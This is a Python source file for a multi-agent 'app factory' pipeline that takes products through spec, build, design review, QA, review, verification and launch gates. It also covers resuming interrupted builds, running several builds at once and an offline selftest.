        _log_comm(cid, "controller", role, "delegate", {"stage": name})        # hand-off out
        r = fn()
        dt = round(time.time() - t0, 1)
        ok = (r.get("passed", True) if isinstance(r, dict) else True)
        _log_comm(cid, role, "controller", "done" if ok else "blocked", {"stage": name})  # hand-back
        try:
            import directory
            directory.release(aid)
        except Exception:
            pass
        try:                                          # per-stage latency -> observability/cost
            import metrics
            metrics.record("stage_done", product=product, task_id=f"{product}:{name}",
                           to_state=name.lower(), model=role, outcome="success" if ok else "blocked")
        except Exception:
            pass
        log["stages"].append({name: r, "_elapsed_s": dt})
        print(f"[factory] {name}: {r} ({dt}s)", flush=True)
        return r

    # SPEC — a PM turns the charter into a real spec + acceptance criteria. The spec must ACCOUNT FOR
    # EVERYTHING before code is written: un-propagated signature changes and un-analyzed enforcement edits
    # are the #1 source of rework loops, so a rigorous IMPACT MAP + parallelization plan is mandatory here.
    stage("SPEC", "product-manager", lambda: agent("product-manager", str(repo),
          f"Read docs/CHARTER.md. Write docs/SPEC.md as a DETAILED PLAN that accounts for EVERYTHING before "
          f"any code is written — a plan that misses a caller or an invariant causes a rework loop. It MUST "
          f"contain these sections:\n"
          f"1. SCOPE & PUBLIC API: what is in/out of scope and the public surface (functions, endpoints, "
          f"schemas, contracts).\n"
          f"2. ACCEPTANCE CRITERIA: a bullet list of testable behaviours (happy path PLUS empty, error, "
          f"loading, and at least one edge/boundary case).\n"
          f"3. IMPACT MAP: every file to be created or changed. For ANY function signature, schema, API, or "
          f"contract you change, grep the codebase and list ALL callers/dependents that must be updated in "
          f"the same change — nothing left un-propagated. If touching enforcement/permissions, map which "
          f"roles/paths each rule affects.\n"
          f"4. INVARIANTS TO PRESERVE: the existing tests, guards, and security constraints that MUST still "
          f"hold after the change (do not weaken them).\n"
          f"5. PARALLELIZATION PLAN: group the work items into those that are INDEPENDENT (can run "
          f"concurrently) vs. those that are ORDERED (and why), so execution can fan out safely.\n"
          f"6. DONE CHECKLIST: each scope item mapped to the specific selftest/guard/test that PROVES it.\n"
          f"Keep it tight and unambiguous — but complete: an item you forget here is a bug shipped later."))

    # BUILD — a builder implements the product from the spec (library OR static web app)
    pkg = product.replace('-', '_')
    if web:
        build_task = (
            "Read docs/SPEC.md. Build a STATIC web app implementing it: index.html at the repo root plus "
            "CSS and vanilla JS. NO build step, NO external CDNs/network — it must work fully offline when "
            "opened over http. Clean, accessible, responsive UI. No console errors on load.\n"
            "TESTABILITY (REQUIRED — QA runs these): put the core logic (parsing, conversion, validation, "
            "computation) in functions that ALSO export under Node: end the logic file with "
            "`if (typeof module !== 'undefined') module.exports = { ...the functions... };` so it works in "
            "BOTH the browser and Node. Write framework-free Node tests at tests/<name>.test.js (use the "
            "stdlib `assert`, `require('../yourfile.js')`, exit non-zero on failure) that exercise EVERY "
            "operation, EVERY error path, and edge cases (empty input, malformed input, special characters, "
            "boundary values). `node tests/<name>.test.js` must pass. The QA gate runs your tests AND a "
            "headless-browser smoke — both must be green.")
    elif ext:
        build_task = (
            "Read docs/SPEC.md. Build a complete, loadable UNPACKED Chrome extension (Manifest V3) that "
            "implements it. At the repo ROOT put manifest.json with manifest_version 3, name, version, "
            "description, and MINIMAL permissions (prefer just \"storage\"; add host_permissions ONLY if "
            "strictly required by the spec). Implement the popup (popup.html/.css/.js) and/or content "
            "scripts and a background service_worker as the feature needs. HARD CONSTRAINTS: 100% "
            "client-side — NO backend, NO network/fetch calls, NO external CDNs/fonts/analytics; persist "
            "ALL state with chrome.storage.local. Use plain script-mode vanilla JS (NO ES-module "
            "import/export syntax) and NO build step. Do NOT include an \"icons\" or \"default_icon\" key "
            "unless you actually create the PNG files — a dev extension loads fine without icons; NEVER "
            "reference a file that doesn't exist. Every file named in manifest.json must exist in the repo.\n"
            "TESTABILITY (REQUIRED — QA runs these): put the behaviour logic (add/edit/delete/search/"
            "export/import, domain derivation) in a module that does NOT call chrome.* at import time — "
            "take a storage object as a parameter (dependency injection) so it is testable without a "
            "browser. Export it for Node: `if (typeof module !== 'undefined') module.exports = {...};`. "
            "Write framework-free Node tests at tests/<name>.test.js using stdlib `assert` and an in-memory "
            "fake storage, covering EVERY behaviour and edge case (empty, duplicate, search hit/miss, "
            "export→import round-trip). `node tests/<name>.test.js` must pass — QA runs it after the static "
            "manifest checks, so a valid manifest alone will NOT pass for a non-working extension.")
    elif service:
        build_task = (
            f"Read docs/SPEC.md. Build a REAL, RUNNABLE HTTP API SERVICE as a MULTI-MODULE Python package "
            f"under src/{pkg}/ (stdlib only, NO external deps):\n"
            f"(1) a SQLite-backed storage/repository layer (DB path from the SQLITE_PATH env, default a "
            f"file under the repo); (2) core handlers/routing with input validation + correct status "
            f"codes; (3) a thin stdlib http.server adapter; (4) src/{pkg}/__main__.py that starts the "
            f"server on 127.0.0.1 at the port from the PORT env var (default 8080) and serves GET /health "
            f"-> 200 JSON. So `python -m src.{pkg}` boots a live server.\n"
            f"TESTS — TWO suites:\n"
            f"  • tests/unit/ : exercise handler + storage functions DIRECTLY, WITHOUT binding a socket "
            f"(use a temp SQLite file per test) — every endpoint, validation error, persistence round-trip.\n"
            f"  • tests/e2e/ : real END-TO-END HTTP flows against a LIVE server — read the base URL from "
            f"os.environ['E2E_BASE'] and use urllib to drive the full user journey across multiple "
            f"endpoints (create -> read -> update/list), asserting status codes and JSON bodies.\n"
            f"Use `from src...` imports. `python -m pytest -q tests/unit` must pass with NO network. "
            f"GET /health must return 200 so the runtime gate can detect readiness.")
    else:
        build_task = (
            f"Read docs/SPEC.md. Implement the product as importable Python under src/ "
            f"(package '{pkg}') AND write a real pytest suite under tests/ that covers every acceptance "
            f"criterion, including edge cases. Use `from src...` imports. Make `python -m pytest -q` pass.")
    stage("BUILD", "builder", lambda: agent("builder", str(repo), build_task))

    # DESIGN/UX — for UI products, design-ux applies the product-quality CRAFT standard to the BUILT UI.
    # The line previously had NO design gate, so UX/forms/accessibility were never reviewed (design-ux was a
    # bench role the pipeline never called) — that is an OS-pipeline defect, the reason basics like a
    # confirm-password field / show-password toggle / input labels shipped unflagged. Now every UI build is
    # reviewed against docs/STANDARDS-product-quality.md and the builder fixes the gaps before QA gates
    # function. Craft is a quality lens (see docs/quality-lenses.yaml), not a blocker — QA/REVIEW still gate.
    if web or ext:
        def design():
            agent("design-ux", str(repo),
                  "Review the BUILT UI against docs/STANDARDS-product-quality.md as a HARD checklist: FORMS "
                  "(confirm-password wherever a password is set; show/hide-password toggle; inline + on-blur "
                  "validation; autocomplete attrs incl. new-password/current-password/email; autofocus first "
                  "field; disabled submit + spinner while pending; Enter-to-submit), ACCESSIBILITY (every input "
                  "has an associated <label> or aria-label; controls keyboard-operable; visible focus ring; "
                  "sufficient contrast; ARIA on menus/dialogs; error text linked to its field), STATES "
                  "(empty/loading/error for every data view), MICROCOPY (plain + specific, no raw enum/JSON), "
                  "CONSISTENCY. Write docs/DESIGN-REVIEW.md listing EVERY gap with the exact file + a concrete "
                  "fix, then END with a line that is EXACTLY 'CRAFT: PASS' (no material gaps) or 'CRAFT: FIX'.",
                  model=CHEAP_MODEL)
            verdict = "FIX"
            dr = repo / "docs" / "DESIGN-REVIEW.md"
            if dr.exists():
                tail = "\n".join(dr.read_text().strip().splitlines()[-6:]).upper()
                verdict = "PASS" if "CRAFT: PASS" in tail and "CRAFT: FIX" not in tail else "FIX"
            if verdict == "FIX":
                agent("builder", str(repo),
                      "Apply EVERY fix in docs/DESIGN-REVIEW.md to bring the UI up to "
                      "docs/STANDARDS-product-quality.md (forms best-practices, accessibility "
                      "labels/focus/ARIA, empty/loading/error states, clear microcopy). Do NOT break existing "
                      "functionality, tests, or remove features.")
            return {"passed": True, "verdict": verdict}
        stage("DESIGN", "design-ux", design)

    # QA — the two-layer ship gate (REBUILD-PLAN C1). Layer 1 is the FAST PRE-GATE: the builder's own
    # tests (pytest / Node tests / browser smoke / MV3 static) with a bounded fix loop — cheap signal,
    # NEVER the gate. Layer 2 is the GROUNDED VERDICT: for web builds the agentic stack (serve the build,
    # story_gen coverage from the charter, qa_explorer drives a real browser, dev_loop fixes blocking
    # bugs); for lib/service/extension an INDEPENDENT qa-security agent that re-runs + verifies the tests
    # itself. Layer 2 writes docs/QA-VERDICT.json — the machine LAUNCH artifact gate_check consumes — and
    # the stage passes only on qa_verdict_ok (passed==true, blocking_open==0, stories>0). The builder
    # never grades its own homework. Both layers are hoisted so the REVIEW cycle can re-verify after a
    # review-driven fix (no quality regress, no stale verdict shipping).
    pre_gate = ((lambda: run_ext_qa(str(repo))) if ext else
                (lambda: run_web_qa(str(repo))) if web else
                (lambda: run_service_qa(str(repo), pkg)) if service else (lambda: run_tests(str(repo))))

    def grounded_verdict():
        """Layer 2: produce + gate on THE machine verdict (refreshes docs/QA-VERDICT.json)."""
        v = run_grounded_qa(product, kind=kind, vision=charter)
        gok = qa_verdict_ok(v)
        gout = (f"grounded verdict: {v.get('verdict')} (stories={v.get('stories')}, "
                f"blocking_open={v.get('blocking_open')}) -> {v.get('verdict_json')}")
        _trace("test", "qa-security",
               "QA grounded verdict (agentic explorer)" if web else "QA grounded verdict (independent qa-security)",
               gout, 0 if gok else 1)
        return gok, gout, v

    def verified_qa():
        """Full re-verification for the REVIEW cycle: pre-gate AND a FRESH grounded verdict — a
        review-driven fix must not regress QA, and the LAUNCH artifact must describe the final code."""
        ok, out = pre_gate()
        if not ok:
            return False, out
        gok, gout, _ = grounded_verdict()
        return gok, out[-800:] + "\n" + gout

    def qa():
        # a stale verdict from a previous run must never satisfy the gate for THIS build's code
        try:
            (repo / "docs" / "QA-VERDICT.json").unlink()
        except FileNotFoundError:
            pass
        except Exception:
            pass
        ok, out = pre_gate()
        label = ("QA pre-gate (extension static)" if ext else "QA pre-gate (browser smoke)" if web else
                 "QA pre-gate (unit + runtime E2E + load)" if service else "QA pre-gate (pytest)")
        _trace("test", "qa-security", label, out, 0 if ok else 1)
        attempts = 0
        while not ok and attempts < MAX_FIX:
            attempts += 1
            print(f"[factory] QA pre-gate red — fix attempt {attempts}/{MAX_FIX}", flush=True)
            fix = (f"The Chrome extension FAILED static QA. Output:\n\n{out[-1800:]}\n\n"
                   f"Fix manifest.json/files (valid MV3, no dangling refs, script-mode JS) AND the "
                   f"FUNCTIONAL Node tests (tests/*.test.js exercising add/edit/delete/search/export). If "
                   f"the failure says 'NO functional tests found', WRITE them with an injected fake storage. "
                   f"`node tests/<name>.test.js` must pass. Add NO network/external resources."
                   if ext else
                   f"The web app FAILED QA. Output:\n\n{out[-1800:]}\n\nQA = your FUNCTIONAL Node tests "
                   f"(tests/*.test.js, every path/error/edge) AND a headless-browser smoke. If it says 'NO "
                   f"functional tests found', WRITE them (export logic via module.exports, use stdlib assert). "
                   f"Make `node tests/<name>.test.js` pass AND the page load with no console errors."
                   if web else
                   f"The SERVICE FAILED QA — this covers BOTH socket-free unit tests AND the runtime gate "
                   f"(server boots via `python -m src.{pkg}` on 127.0.0.1:$PORT, end-to-end HTTP flows in "
                   f"tests/e2e against the live server, and a concurrency load probe on /health). "
                   f"Output:\n\n{out[-1800:]}\n\nFix src/ (or a genuinely wrong test) so the server boots, "
                   f"/health returns 200, the e2e flows pass, and it survives load. Do not delete tests."
                   if service else
                   f"`python -m pytest -q` is FAILING. Here is the output:\n\n{out[-1800:]}\n\n"
                   f"Fix the code under src/ (or a genuinely wrong test) so all tests pass. "
                   f"Do not delete tests to make them pass.")
            agent("builder", str(repo), fix)
            ok, out = pre_gate()
        if not ok:                                    # pre-gate never went green -> no grounded round
            return {"passed": False, "fix_attempts": attempts, "pre_gate": False, "tail": out[-400:]}
        gok, gout, v = grounded_verdict()             # THE gate: the grounded, independent verdict
        return {"passed": gok, "fix_attempts": attempts, "pre_gate": True,
                "stories": v.get("stories"), "blocking_open": v.get("blocking_open"),
                "verdict": v.get("verdict"), "verdict_json": v.get("verdict_json"),
                "tail": gout[-400:]}
    qa_res = stage("QA", "qa-security", qa)

    # REVIEW — an independent reviewer whose verdict is LOAD-BEARING. Development isn't purely linear:
    # REQUEST-CHANGES drives a bounded review -> fix -> re-QA -> re-review CYCLE. After the cycle, an
    # unresolved REQUEST-CHANGES is escalated to a human (not silently shipped); QA stays the hard gate.
    qa_ok = [bool(qa_res.get("passed"))]      # mutable: the re-QA inside the cycle may change it

    def review():
        def do_review():
            # The reviewer is a READ-ONLY role (no Edit/Write/Bash) so it CANNOT write docs/REVIEW.md — it
            # returns its findings + verdict in its REPLY, and the FACTORY (not the agent) persists them so
            # the verdict survives crash-resume and the builder fix loop below can read the concrete risks.
            res = agent("reviewer", str(repo),
                  f"Review the implementation against docs/SPEC.md (and docs/REVIEW.md if it exists). You "
                  f"are READ-ONLY — do NOT write files; put your full review IN YOUR REPLY: what's correct, "
                  f"concrete risks, and END YOUR REPLY WITH A LINE that is EXACTLY 'VERDICT: APPROVE' or "
                  f"'VERDICT: REQUEST-CHANGES'. QA is currently {'GREEN' if qa_ok[0] else 'RED'}.",
                  model=CHEAP_MODEL)
            # A FAILED reviewer run is NO review signal — NOT review content. agent() returns failed=True /
            # rc=-1 with a non-empty BLOCKER sentinel ('halted', 'budget/token budget exhausted', 'spawn
            # denied') that contains no VERDICT line, so feeding it to _review_verdict would hit the
            # have_signal path and silently APPROVE an UNREVIEWED build (and persist the blocker as the review
            # artifact). Fail CLOSED: treat any non-success as a missing review -> REQUEST-CHANGES, which
            # escalates to a human (BLOCKED_AT_REVIEW) instead of shipping. Only a CLEAN run (rc==0, not
            # failed) is persisted and parsed as the verdict.
            if not isinstance(res, dict) or res.get("failed") or res.get("rc") not in (0, None):
                return "", "REQUEST-CHANGES"
            out = res.get("out") or ""
            if out.strip():                              # persist the reviewer's reply as the review artifact
                try:
                    (Path(repo) / "docs").mkdir(parents=True, exist_ok=True)
                    (Path(repo) / "docs" / "REVIEW.md").write_text(out)
                except Exception:
                    pass
            return out, _review_verdict(repo, out)
        review_out, verdict = do_review()
        cycles = 0
        while verdict == "REQUEST-CHANGES" and qa_ok[0] and cycles < MAX_REVIEW:
            cycles += 1
            print(f"[factory] REVIEW requested changes — fix cycle {cycles}/{MAX_REVIEW}", flush=True)
            agent("builder", str(repo),
                  "The independent reviewer REQUESTED CHANGES (also in docs/REVIEW.md). Address every "
                  "risk/change it raised:\n\n" + (review_out or "(see docs/REVIEW.md)") + "\n\nDo NOT "
                  "remove or weaken tests, and add NO network/external dependencies.")
            # re-verify the FULL gate (pre-gate + a FRESH grounded verdict): a review fix must not
            # regress QA, and the persisted LAUNCH artifact must describe the code that actually ships.
            ok, out = verified_qa()
            _trace("test", "qa-security", f"re-QA after review cycle {cycles}", out, 0 if ok else 1)
            qa_ok[0] = ok
            review_out, verdict = do_review()
        return {"passed": qa_ok[0], "verdict": verdict, "cycles": cycles}
    review_res = stage("REVIEW", "reviewer", review)

    # VERIFY gate — scalable verification is part of the ship gate BY DEFAULT now, not an opt-in. The old
    # path only ran when AOS_RIGOR>=2, but AOS_RIGOR defaults to 1, so products LAUNCHED on their test
    # suite ALONE — no static-security scan, no adversarial probing (finding #50). We now ALWAYS run the
    # deterministic static-security scan before flipping to LAUNCHED, and ADD the adversarial bug-hunt when
    # the (budget-scaled) rigor warrants it. AOS_RIGOR=0 is the explicit, audited escape hatch for
    # throwaway/offline builds; verification is never silently skipped. (We call the cheap, side-effect-
    # free static scan directly rather than verify.verify, whose tier-1 re-runs pytest — wrong for the
    # web/extension lines that have no pytest suite, and redundant with the QA gate just above.)
    rigor = int(os.environ.get("AOS_RIGOR", "1"))
    verify_ok = True
    if rigor != 0 and qa_ok[0] and review_res.get("verdict") != "REQUEST-CHANGES":
        verify_checks = []
        try:
            import verify as _verify
            sec_ok, findings = _verify.static_security(repo, rigor)  # mandatory gate; rigor scopes NOISY patterns (no spend, no infra)
            verify_checks.append({"check": "static-security", "ok": sec_ok, "findings": findings[:5]})
            verify_ok = sec_ok
            if sec_ok and rigor >= 3 and not (web or ext):       # budget allows -> adversarial (python lines)
                n = min(int(os.environ.get("AOS_MAX_ADVERSARIES", "8")), rigor)
                adv_ok, adv = _verify.adversarial(repo, n, api_key, _ctx.engine, _ctx.codex_key)
                verify_checks.append({"check": "adversarial", "ok": adv_ok, "agents": n})
                verify_ok = verify_ok and adv_ok
            log["verify"] = {"passed": verify_ok, "rigor": rigor, "checks": verify_checks}
        except Exception as e:
            # FAIL-CLOSED: a security/verification gate that ERRORS must not wave the product through (the
            # whole finding is products shipping unverified). This is a deliberate flip from the prior
            # fail-open. To keep liveness we fail closed only to BLOCKED_AT_VERIFY — a human-reviewable hold
            # with a notify, never a crash — and the operator can re-run verify or set AOS_RIGOR=0.
            verify_ok = False
            log["verify"] = {"passed": False, "rigor": rigor, "error": str(e)[:200], "checks": verify_checks}

    # LAUNCH — QA is the hard gate. A review verdict still REQUEST-CHANGES after the cycle escalates.
    if qa_ok[0] and review_res.get("verdict") != "REQUEST-CHANGES" and verify_ok:
        stage("LAUNCH", "tech-lead", lambda: agent("tech-lead", str(repo),
              "Write docs/LAUNCH-CHECKLIST.md (how to install, run, and the test command) and a short "
              "README.md. This product passed QA and review and is cleared to ship.", model=CHEAP_MODEL))
        log["result"] = "LAUNCHED"
    elif qa_ok[0] and not verify_ok:          # QA + review green but scalable verification failed
        log["result"] = "BLOCKED_AT_VERIFY"   # quality bar not met — don't ship
        try:
            import notify
            notify.send(f"⛔ {product} BLOCKED_AT_VERIFY — QA+review green but verification (rigor {rigor}) "
                        f"failed; needs your call", title="app factory", priority="high", tags="warning")
        except Exception:
            pass
    elif qa_ok[0]:                            # QA green but reviewer still wants changes after the cycle
        log["result"] = "BLOCKED_AT_REVIEW"   # don't silently ship over an unresolved reviewer objection
        try:
            import notify
            notify.send(f"⛔ {product} BLOCKED_AT_REVIEW — QA green but reviewer still REQUEST-CHANGES "
                        f"after {review_res.get('cycles')} cycle(s); needs your call",
                        title="app factory", priority="high", tags="warning")
        except Exception:
            pass
    else:
        log["result"] = "BLOCKED_AT_QA"   # the line refuses to ship red code
    audit.append(actor="factory:controller", action="ProductComplete", resource=product,
                 decision=log["result"], payload={"stages": len(log["stages"])})
    try:                                              # record in the lifecycle registry (kind/version/deps/readme)
        import appregistry
        appregistry.register(product, repo)
    except Exception:
        pass
    # proactive push so you learn the outcome without watching anything
    try:
        import notify
        fixes = qa_res.get("fix_attempts", 0)
        if log["result"] == "LAUNCHED":
            notify.send(f"✅ {product} shipped — LAUNCHED (QA green, {fixes} fix loops)",
                        title="app factory", tags="rocket")
        else:
            notify.send(f"⛔ {product} BLOCKED_AT_QA after {fixes} fix attempts — needs you",
                        title="app factory", priority="high", tags="warning")
    except Exception:
        pass
    print(f"\n[factory] {product}: {log['result']}", flush=True)
    return log


def _detect_kind(repo: Path) -> str:
    """Recover a product's build kind for resume: from the CHARTER.md header `(kind)`, else disk shape."""
    ch = repo / "docs" / "CHARTER.md"
    if ch.exists():
        first = (ch.read_text().splitlines() or [""])[0]
        if first.endswith(")") and "(" in first:
            k = first.rsplit("(", 1)[-1].rstrip(")").strip()
            if k in ("lib", "web", "service", "extension"):
                return k
    if (repo / "manifest.json").exists():
        return "extension"
    if (repo / "index.html").exists():
        return "web"
    return "lib"


def _build_process_alive(product: str) -> bool:
    """GROUND-TRUTH liveness for the resume sweep: is a `factory.py build <product>` process running RIGHT
    NOW? Trace/audit idleness is a heuristic (a legitimately long agentic-QA exploration can go quiet for
    longer than any idle threshold — that false 'stall' once resumed a build whose original process was
    still alive, giving TWO concurrent writers of docs/QA-VERDICT.json). Fail-closed for the sweep: if we
    cannot determine liveness, report alive=True so we never double-launch on a broken probe."""
    try:
        r = subprocess.run(["pgrep", "-f", f"factory.py build {product} "], capture_output=True, timeout=10)
        if r.returncode == 0:
            return True
        # exact-arg fallback: the product may be the last argv (no trailing space in the cmdline)
        r2 = subprocess.run(["pgrep", "-f", f"factory.py build {product}$"], capture_output=True, timeout=10)
        return r2.returncode == 0
    except Exception:
        return True


def find_incomplete_builds(max_age_min: int = 20):
    """Builds that were INTERRUPTED, not finished: BUILD checkpointed (rc=0) but the line never reached a
    terminal verdict (no 'ProductComplete' audit — that row is written for BOTH launched AND blocked-at-QA,
    so a genuinely-blocked build is NOT considered interrupted and won't be re-resumed forever), idle
    for >= max_age_min, AND with no live build process (trace idleness alone once false-positived on a
    long agentic-QA run and spawned a duplicate line). Returns [(product, kind), ...]."""
    out = []
    with psycopg.connect(_DB) as c, c.cursor() as cur:
        cur.execute("""
            SELECT t.run_id
              FROM traces t
              LEFT JOIN audit_log a
                     ON a.action='ProductComplete' AND a.resource = substring(t.run_id from 7)
             WHERE t.run_id LIKE 'build-%%'
             GROUP BY t.run_id
            HAVING bool_or(t.stage='BUILD' AND t.kind='agent' AND t.rc=0)   -- BUILD finished
               AND count(a.id) = 0                                          -- but no terminal verdict
               AND max(t.ts) < now() - (%s || ' minutes')::interval         -- and gone idle
             ORDER BY max(t.ts)
        """, (max_age_min,))
        for (run_id,) in cur.fetchall():
            product = run_id[len("build-"):]
            if _build_process_alive(product):             # still running — NOT interrupted, never duplicate
                continue
            out.append((product, _detect_kind(PRODUCTS / product)))
    return out


def resume_incomplete_builds(max_age_min: int = 20, limit: int = 3) -> dict:
    """Self-healing for interrupted builds (e.g. a provider outage killed the line mid-run). Finds builds
    that finished BUILD but never reached a terminal verdict and have gone idle, and RE-LAUNCHES each as a
    DETACHED process that resumes from its checkpoint (SPEC/BUILD skipped, continues at QA). Each resume
    runs independently so this sweep returns immediately — safe to call from the 120s-bounded scheduler."""
    cands = find_incomplete_builds(max_age_min)[:limit]
    resumed = []
    for product, kind in cands:
        f = open(f"/tmp/resume-{product}.log", "a")
        # empty charter is intentional: on resume CHARTER.md already exists so it is preserved, and SPEC/
        # BUILD are checkpoint-skipped — only QA/REVIEW/LAUNCH (which read SPEC.md) actually run.
        subprocess.Popen([sys.executable, str(SCRIPTS / "factory.py"), "build", product, "", kind],
                         stdout=f, stderr=f, stdin=subprocess.DEVNULL,
                         start_new_session=True, cwd=str(SCRIPTS.parent))
        audit.append(actor="factory:resume-sweep", action="ResumeBuild", resource=product,
                     decision="relaunched", payload={"kind": kind})
        resumed.append({"product": product, "kind": kind})
    if resumed:
        try:
            import notify
            notify.send(f"♻ auto-resumed {len(resumed)} interrupted build(s): " +
                        ", ".join(r["product"] for r in resumed),
                        title="self-heal", tags="recycle")
        except Exception:
            pass
    return {"found": len(cands), "resumed": resumed}


def dispatch_fleet(specs, max_workers=None):
    """Build several products CONCURRENTLY — the app factory at scale. Each runs its own governed line
    (own repo, own audit/comms rows), so they all show up together on the mission-control dashboard.
    specs = [{"product": "...", "charter": "..."}, ...]. Bounded by max_workers parallel lines AND the
    global _AGENT_SEM cap on total live agent subprocesses (AOS_MAX_AGENTS)."""
    max_workers = max_workers or int(os.environ.get("AOS_FLEET_WORKERS", "5"))
    results = {}
    audit.append(actor="factory:controller", action="FleetStart", resource=f"{len(specs)} products",
                 decision="executed", payload={"workers": max_workers})
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futs = {ex.submit(build_product, s["product"], s.get("charter", ""), s.get("kind", "lib")): s["product"]
                for s in specs}
        for f in as_completed(futs):
            name = futs[f]
            try:
                results[name] = (f.result() or {}).get("result", "UNKNOWN")
            except Exception as e:
                results[name] = f"ERROR: {e}"
    launched = sum(1 for v in results.values() if v == "LAUNCHED")
    try:
        import notify
        notify.send(f"🏭 fleet done: {launched}/{len(results)} LAUNCHED — " +
                    ", ".join(f"{k}:{v}" for k, v in results.items()), title="app factory", tags="factory")
    except Exception:
        pass
    print(f"\n[factory] FLEET COMPLETE: {results}", flush=True)
    return results


def _main(a):
    if not a:
        sys.exit("usage: factory.py agent|build|fleet|selftest ...")
    if a[0] == "agent":
        print(agent(a[1], a[2], a[3]))
    elif a[0] == "build":
        charter = a[2] if len(a) > 2 else "Build a small, well-tested Python library."
        build_product(a[1], charter, a[3] if len(a) > 3 else "lib")
    elif a[0] == "resume-sweep":                       # self-heal interrupted builds (scheduler-driven)
        age = int(a[1]) if len(a) > 1 else 20
        print(resume_incomplete_builds(max_age_min=age))
    elif a[0] == "fleet":
        raw = Path(a[1]).read_text() if len(a) > 1 and Path(a[1]).exists() else (a[1] if len(a) > 1 else "[]")
        dispatch_fleet(json.loads(raw), int(a[2]) if len(a) > 2 else 3)
    elif a[0] == "selftest":
        brief = role_brief("builder")
        ok = "builder" in brief and "NEVER" in brief.upper() and PRODUCTS.parent.exists()
        print("role-brief assembled from manifest:", brief[:90], "...")

        # --- LATENCY FAST PATH: warm-HTTP BYO-key light turn (no model call; helpers are pure/offline) ---
        # honest cost accounting for the raw API path
        cost_ok = (abs(_api_cost("claude-haiku-4-5", 1_000_000, 0) - 1.0) < 1e-9 and
                   abs(_api_cost("claude-haiku-4-5", 0, 1_000_000) - 5.0) < 1e-9 and
                   abs(_api_cost("claude-haiku-4-5", 0, 0, cache_r=1_000_000) - 0.1) < 1e-9)
        # the SDK client is POOLED per key (warm connection reused across turns)
        pool_ok = True
        if _anthropic_available():
            try:
                pool_ok = _anthropic_client("sk-selftest-A") is _anthropic_client("sk-selftest-A") \
                    and _anthropic_client("sk-selftest-A") is not _anthropic_client("sk-selftest-B")
            except Exception:
                pool_ok = False

        # --- STOP IS REAL: a cancelled streaming turn returns cancelled (never a persisted reply) ---
        import inspect
        sig_ok = ("cancel" in inspect.signature(agent_stream).parameters and
                  "cancel" in inspect.signature(_run_once_stream).parameters and
                  hasattr(StreamStopped, "__mro__") and issubclass(StreamStopped, Exception))
        _orig_gate, _orig_scale, _orig_avail, _orig_stream, _orig_audit = (
            _chat_gates, _apply_scale, _anthropic_available, _stream_api, audit.append)
        cancel_ok = success_ok = False
        try:
            globals()["_chat_gates"] = lambda *a, **k: None       # bypass DB-backed gates in the offline test
            globals()["_apply_scale"] = lambda: None
            globals()["_anthropic_available"] = lambda: True
            audit.append = lambda **k: None
            _ctx.api_key = "sk-selftest-A"; _ctx.engine = "claude"
            seen = []
            # cancelled turn: _stream_api reports cancelled=True -> agent_stream must DISCARD (no reply out)
            globals()["_stream_api"] = lambda *a, **k: (0, "partial…", 0.0, 0, 0, CHEAP_MODEL, True)
            rc = agent_stream("research-growth", str(PRODUCTS), "hi", seen.append)
            cancel_ok = rc.get("cancelled") is True and rc.get("failed") is True and not rc.get("out")
            # normal turn: streamed tokens delivered + a success dict returned
            globals()["_stream_api"] = lambda role, p, m, od, key, to, c=None: (
                od("hello ") or od("world") or (0, "hello world", 0.0002, 12, 3, CHEAP_MODEL, False))
            seen.clear()
            rc2 = agent_stream("research-growth", str(PRODUCTS), "hi", seen.append)
            success_ok = (rc2.get("rc") == 0 and rc2.get("engine") == "api" and "hello" in "".join(seen)
                          and rc2.get("out_full") == "hello world")
        finally:
            globals()["_chat_gates"] = _orig_gate; globals()["_apply_scale"] = _orig_scale
            globals()["_anthropic_available"] = _orig_avail; globals()["_stream_api"] = _orig_stream
            audit.append = _orig_audit; _ctx.api_key = None

        # --- C1 SHIP GATE (offline): the grounded-verdict wiring. qa_verdict_ok mirrors gate_check's
        # LAUNCH condition exactly, and run_independent_qa must (a) pass + persist the LAUNCH artifact
        # on real story-level evidence, (b) FAIL CLOSED (blocking finding, failing artifact) when the
        # independent verifier yields no verifiable signal. All AI + audit calls stubbed — no spend.
        import tempfile as _tf
        gate_ok = (qa_verdict_ok({"passed": True, "blocking_open": 0, "stories": 3})
                   and not qa_verdict_ok({"passed": True, "blocking_open": 1, "stories": 3})
                   and not qa_verdict_ok({"passed": True, "blocking_open": 0, "stories": 0})
                   and not qa_verdict_ok({"passed": "yes", "blocking_open": 0, "stories": 3})
                   and not qa_verdict_ok({}) and not qa_verdict_ok(None))
        indep_pass_ok = indep_fail_ok = artifact_ok = False
        _c1repo = Path(_tf.mkdtemp(prefix="factory-c1-"))
        _orig_agent, _orig_audit2 = globals()["agent"], audit.append
        try:
            audit.append = lambda **k: None
            good = json.dumps({"stories": [{"id": "US-1", "title": "adds two numbers",
                                            "expected": "returns the sum", "status": "passed",
                                            "evidence": "$ pytest -q -> 4 passed"}],
                               "bugs": [], "not_covered": "sustained load"})
            globals()["agent"] = lambda role, repo, prompt, **k: {"rc": 0, "out": good, "out_full": good}
            v_good = run_independent_qa(str(_c1repo), "c1demo", "a tiny adder lib", "lib")
            indep_pass_ok = (qa_verdict_ok(v_good) and v_good["verdict_json"]
                             and Path(v_good["verdict_json"]).exists())
            globals()["agent"] = lambda role, repo, prompt, **k: {"rc": 1, "failed": True, "out": ""}
            v_bad = run_independent_qa(str(_c1repo), "c1demo", "a tiny adder lib", "lib")
            indep_fail_ok = (not qa_verdict_ok(v_bad)) and int(v_bad.get("blocking_open") or 0) >= 1
            vdoc = json.loads((_c1repo / "docs" / "QA-VERDICT.json").read_text())
            artifact_ok = vdoc["passed"] is False and vdoc["producer"] == "independent-qa"
        except Exception as e:
            print(f"C1 gate selftest error: {e}")
        finally:
            globals()["agent"] = _orig_agent
            audit.append = _orig_audit2
            shutil.rmtree(_c1repo, ignore_errors=True)

        # --- CROSS-PROVIDER FAILOVER: a Claude/API-key run must still be able to fall over to Codex when
        # Codex credentials are explicitly available. This is the regression guard for the old `not key`
        # condition, which skipped Codex whenever ANTHROPIC_API_KEY was set.
        _orig_run_once, _orig_run_codex, _orig_which, _orig_audit3, _orig_trace, _orig_halt = (
            globals()["_run_once"], globals()["_run_once_codex"], shutil.which, audit.append,
            globals()["_trace"], killswitch.is_halted)
        failover_ok = fallback_env_ok = False
        _old_ctx = {k: getattr(_ctx, k, None) for k in ("tenant", "engine", "api_key", "codex_key", "product")}
        try:
            audit.append = lambda **k: None
            globals()["_trace"] = lambda *a, **k: None
            killswitch.is_halted = lambda scope="global": {"halted": False}
